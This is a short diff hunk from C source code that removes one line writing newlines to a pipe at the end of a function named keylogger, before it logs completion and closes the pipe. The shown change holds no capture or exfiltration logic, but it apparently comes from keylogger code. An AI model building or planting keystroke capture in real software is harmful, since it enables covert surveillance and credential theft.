@@ -110,7 +110,6 @@ void keylogger(int keyboard, int write_pipe) {
         }
     }
 
-    write(write_pipe, "\n\n", sizeof("\n\n"));
     syslog(LOG_INFO, "Keylogger finished, closing write end of pipe");
     close(write_pipe);
 }
